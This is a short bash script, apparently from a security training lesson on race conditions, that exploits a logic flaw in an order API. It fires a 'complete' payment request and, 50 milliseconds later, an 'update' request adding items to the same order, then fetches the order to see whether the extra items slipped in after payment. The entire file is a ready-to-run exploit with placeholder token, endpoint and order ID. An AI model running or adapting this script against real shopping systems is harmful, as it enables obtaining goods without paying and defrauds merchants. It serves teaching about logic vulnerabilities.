#!/bin/bash
# Lesson 8 — Race Condition (Logic Vulnerability)
# Replace TOKEN, API, ORDER_ID before running.
# Usage: bash run.sh

TOKEN="YOUR_JWT_TOKEN_HERE"
API="YOUR_API_ENDPOINT_HERE"
ORDER_ID="YOUR_ORDER_ID_HERE"

printf '{"action":"complete","order-id":"'"$ORDER_ID"'"}' > /tmp/lesson8-pay.json
printf '{"action":"update","order-id":"'"$ORDER_ID"'","items":{"1020":5}}' > /tmp/lesson8-update.json

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  --data-binary @/tmp/lesson8-pay.json > /tmp/pay-result.txt &

sleep 0.05

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  --data-binary @/tmp/lesson8-update.json > /tmp/update-result.txt

wait
echo "Pay result:    $(cat /tmp/pay-result.txt)"
echo "Update result: $(cat /tmp/update-result.txt)"

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  -d '{"action":"get","order-id":"'"$ORDER_ID"'"}' | python3 -m json.tool